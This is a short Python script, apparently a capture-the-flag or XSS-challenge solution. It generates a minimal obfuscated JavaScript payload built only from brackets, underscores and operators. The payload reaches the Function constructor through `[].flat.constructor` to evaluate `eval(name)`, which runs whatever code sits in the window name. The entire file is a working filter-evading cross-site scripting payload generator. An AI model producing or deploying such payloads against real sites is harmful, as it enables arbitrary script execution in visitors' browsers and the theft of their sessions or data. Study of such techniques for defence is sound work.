from collections import Counter
from typing import Dict, Tuple
import re

chars = {
    "(": "__[+[]]",
    ")": "__[_]",
    "a": "((_>_)+[])[_]",
    "c": "__[+(_+[]+_)]",
    "e": "__[+(_+_+[]+_)]",
    "f": "((_>_)+[])[+[]]",
    "l": "((_>_)+[])[_+_]",
    "m": "__[+(_+[]+(_+_+_+_+_+_+_))]",
    "n": "([][[]]+[])[_]",
    "o": "__[+(_+[]+(_+_))]",
    "r": "((_==_)+[])[_]",
    "s": "__[+(_+[]+(_+_+_+_))]",
    "t": "((_==_)+[])[+[]]",
    "u": "((_==_)+[])[_+_]",
    "v": "__[+(_+_+_+[]+_+(_+_+_+_+_))]",
}

strings = ["flat", "constructor", "eval(name)"]

frequencies = Counter("".join(strings))

savings: Dict[str, int] = dict()

for ch, freq in frequencies.items():
    if freq <= 1:
        continue
    savings[ch] = len(chars[ch]) * (freq - 1)

savings_sorted = sorted((num, ch) for ch, num in savings.items())


def make_string(
    string: str, chars: Dict[str, str], memo: Dict[str, Tuple[str, bool]]
) -> str:
    def lookup_char(c: str) -> str:
        if c in memo:
            short, defined = memo[c]
            if defined:
                return short
            else:
                memo[c] = short, True
                return f'({short}={chars[c]})'
        else:
            return chars[c]
    return "+".join(lookup_char(c) for c in string)


def gen_payload_n(n: int) -> str:
    shim_begin = "(__=>"
    shim_end = ")"
    s_chars = chars.copy()
    memo: Dict[str, Tuple[str, bool]] = dict()
    for i in range(n):
        n_underscore = i + 3
        ch = savings_sorted[i][1]
        short = "_" * n_underscore
        memo[ch] = (short, False)
    encode = lambda s: make_string(s, s_chars, memo)
    encoded = f'[][{encode("flat")}][{encode("constructor")}]({encode("eval(name)")})'
    # assign __ (IIFE) to string representation on first use
    encoded = re.sub(r'(?<!_)__\[', '(__=__+[])[', encoded, count=1)
    # memoize 1 in _
    match = re.search(r'(\()?(?<!_)(_)(?!_)(\))?', encoded)
    assert match is not None
    if match.group(1, 3) == ('(', ')'):
        begin, end = match.span(0)
    else:
        begin, end = match.span(2)
    encoded = encoded[:begin] + '(_=[]**[])' + encoded[end:]
    return shim_begin + encoded + shim_end


def gen_payload() -> str:
    best = (999999, "")
    for n in range(len(savings) + 1):
        payload = gen_payload_n(n)
        pl_len = len(payload)
        if pl_len < best[0]:
            best = (pl_len, payload)
    return best[1]


if __name__ == "__main__":
    print(gen_payload())
